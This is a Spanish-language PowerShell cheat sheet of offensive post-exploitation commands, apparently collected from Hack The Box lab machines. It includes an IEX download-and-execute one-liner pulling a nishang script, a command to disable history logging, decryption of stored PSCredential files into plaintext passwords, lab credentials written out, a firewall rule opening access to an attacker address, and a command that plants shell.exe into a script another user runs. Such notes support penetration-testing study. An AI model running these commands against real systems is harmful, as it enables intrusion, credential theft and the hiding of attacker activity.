# Powershell

## Ejecución de scripts remotos

```
IEX(New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1")
```

## Listar procesos

```
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> Get-Process
```

## Ver historial

```jsx
(Get-PSReadlineOption).HistorySavePath
```

```jsx
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Truco para no guardar historial

```jsx
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

```jsx
unset HISTFILE
```

## Obtener ADS

```jsx
dir /r /s
more < hm.txt:root.txt
```

## Obtener SID

```jsx
$(Get-ADUser Administrator).SID.Value
```

## Obtener Domain Admins

```jsx
Get-ADGroup "Domain Admins" -Properties member | select -ExpandProperty Member
```

## Secure-String a Plain-Text

```jsx
$s = cat .\admin-pass.xml
$ss = ConvertTo-SecureString $s
$cred = New-Object System.Management.Automation.PSCredential('administrator', $ss)
	$cred.getNetworkCredential() | fl *
```

### Desde XML

```jsx
C:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

```jsx
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## Script Blocks

```jsx
$user = 'scrm.local\miscvc'
$password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $password)
Invoke-Command -ComputerName localhost -Credential $Cred -ScriptBlock { whoami }
```

## PS-Sessions

```jsx
$pass = ConvertTo-SecureString 'kittycat1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\k.svensson', $pass)
Enter-PSSession -ComputerName 10.10.10.210 -Credential $cred -Authentication Negotiate
Enter-PSSession -ComputerName 10.10.10.210 -Credential $cred -Authentication Negotiate -ConfigurationName jea_test_account
```

## Listar reglas de Firewall

```jsx
netsh advfirewall show currentprofile
```

```jsx
cmd /c powershell -c Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
```

```jsx
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Format-Table -Property Name,DisplayName,DisplayGroup,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Enabled,Profile,Direction,Action
```

## Obtener Eventos

```jsx
Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 10 | Get-WinEventData | fl *
Get-WinEvent -FilterHashtable @{Logname='security';id=4688} | Get-WinEventData | Select e_CommandLine | ft -AutoSize
```

## WAF Evasion (Administrator)

```jsx
New-NetFirewallRule -DisplayName rubbx -RemoteAddress 10.10.14.13 -Direction inbound -Action allow
```

## Remplazar contenido

```jsx
PS C:\Utils> Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content C:\Users\imonks\Desktop\wm.ps1 -Raw) -Replace 'Get-Volume','cmd.exe /c C:\Utils\shell.exe') | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1 }
```

## Listar sesiones RDP

```jsx
PS C:\Windows\System32\spool\drivers\color>qwinsta /server:127.0.0.1
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
 console           edavies                   1  Active
```

## Tomar captura de pantalla

```jsx
PS C:\Windows\System32\spool\drivers\color> .\nircmd.exe savescreenshot captura.png
```